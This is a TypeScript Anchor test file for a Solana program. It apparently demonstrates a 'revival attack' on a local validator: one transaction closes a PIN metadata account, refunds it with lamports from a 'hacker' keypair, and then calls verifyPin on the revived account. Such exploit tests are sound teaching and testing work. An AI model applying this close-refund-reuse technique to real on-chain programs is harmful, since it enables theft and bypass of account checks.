import * as anchor from "@coral-xyz/anchor";
import { web3 } from "@coral-xyz/anchor";

import { Program } from "@coral-xyz/anchor";
import { RevivalAttack } from "../../target/types/revival_attack";

describe("revival-attack", () => {
  let provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.RevivalAttack as Program<RevivalAttack>;

  const creator = web3.Keypair.generate();
  const hacker = web3.Keypair.generate();



  before("Fund the users!", async () => {
    await airdrop(provider.connection, creator.publicKey);
    await airdrop(provider.connection, hacker.publicKey);
  });

  it("Initialize!", async () => {
    const [metadata, mBump] = web3.PublicKey.findProgramAddressSync([Buffer.from("secret_metadata"), creator.publicKey.toBuffer()], program.programId);

    await program.methods.initializeMetadata(1, 2, 3, 4).accounts({
      creator: creator.publicKey,
      secretMetadata: metadata,
      systemProgram: web3.SystemProgram.programId,
    }).signers([creator]).rpc({ commitment: "confirmed" });
  });
  it("Verify PIN - 1!!", async () => {
    const [metadata, mBump] = web3.PublicKey.findProgramAddressSync([Buffer.from("secret_metadata"), creator.publicKey.toBuffer()], program.programId);

    await program.methods.verifyPin(0, 0, 0, 0).accounts({
      creator: creator.publicKey,
      metadata: metadata,
      systemProgram: web3.SystemProgram.programId,
    }).signers([creator]).rpc({ commitment: "confirmed" });


  });
  it("Verify PIN - 2!!", async () => {
    const [metadata, mBump] = web3.PublicKey.findProgramAddressSync([Buffer.from("secret_metadata"), creator.publicKey.toBuffer()], program.programId);

    await program.methods.verifyPin(0, 0, 0, 0).accounts({
      creator: hacker.publicKey,
      metadata: metadata,
      systemProgram: web3.SystemProgram.programId,
    }).signers([hacker]).rpc({ commitment: "confirmed" });


  });
  it("Revival Attack", async () => {
    const [metadata, mBump] = web3.PublicKey.findProgramAddressSync([Buffer.from("secret_metadata"), creator.publicKey.toBuffer()], program.programId);

    const tx = new web3.Transaction();
    let close_ix = await program.methods.closeMetadata().accounts({
      creator: creator.publicKey,
      metadata: metadata,
    }).instruction();

    const fund_ix = await web3.SystemProgram.transfer({ fromPubkey: hacker.publicKey, toPubkey: metadata, lamports: 0.5 * web3.LAMPORTS_PER_SOL });

    const verify_ix = await program.methods.verifyPin(0, 0, 0, 0).accounts({
      creator: creator.publicKey,
      metadata: metadata,
    }).instruction();

    tx.add(close_ix, fund_ix, verify_ix);
    await provider.sendAndConfirm(tx, [hacker, creator]);
  });


});
export async function airdrop(
  connection: any,
  address: any,
  amount = 500_000_000_000
) {
  await connection.confirmTransaction(
    await connection.requestAirdrop(address, amount),
    'confirmed'
  );
}
